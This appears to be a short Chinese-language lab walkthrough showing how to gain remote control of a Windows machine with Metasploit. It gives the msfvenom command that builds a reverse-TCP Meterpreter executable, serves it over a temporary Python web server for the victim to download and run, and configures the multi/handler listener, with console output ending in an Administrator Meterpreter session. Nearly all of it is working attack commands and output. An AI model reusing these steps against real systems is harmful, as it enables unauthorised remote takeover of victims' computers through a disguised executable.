（ps.第二次拿权限的时候直接运行exploit/multi/handler模块搭载PAYLOAD windows/meterpreter/reverse_tcp然后在目标机器上运行脚本程序就行了）
1. 先使用这句           `msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.232.131 LPORT=4444 -f exe>ma2.exe`生成一个windows攻击脚本
1. 然后用python3 -m http.server命令生成一个临时服务器
```
root@kali:~# python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
192.168.232.134 - - [10/Nov/2019 20:36:54] "GET / HTTP/1.1" 200 -
192.168.232.134 - - [10/Nov/2019 20:36:57] "GET /ma2.exe HTTP/1.1" 200 -
```

3，然后用其他的windows虚拟机访问http://192.168.232.131:8000下载ma2.exe然后再运行

4，到后台使用`use exploit/multi/handler`漏洞利用模块然后`set PAYLOAD windows/meterpreter/reverse_tcp`然后show options查看设置，然后设置攻击的lhost 0.0.0.0和set lport 4444然后exploit
，当用户下载运行ma2.exe后就可以得到权限

```
msf5 > use exploit/multi/handler
msf5 exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_tcp
PAYLOAD => windows/meterpreter/reverse_tcp
msf5 exploit(multi/handler) > show options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST                      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port
   msf5 exploit(multi/handler) > set LhOST 0.0.0.0
    LhOST => 0.0.0.0
    msf5 exploit(multi/handler) > set lPORT 4444
    lPORT => 4444
    msf5 exploit(multi/handler) > exploit
    [*] Started reverse TCP handler on 0.0.0.0:4444 
    [*] Sending stage (179779 bytes) to 192.168.232.134
    [*] Meterpreter session 1 opened (192.168.232.131:4444 -> 192.168.232.134:1054) at 2019-11-10 20:36:59 +0800
    
    meterpreter > getuid
    Server username: ROOT-FBD74BACF7\Administrator
    meterpreter > Interrupt: use the 'exit' command to quit
    meterpreter > 

```

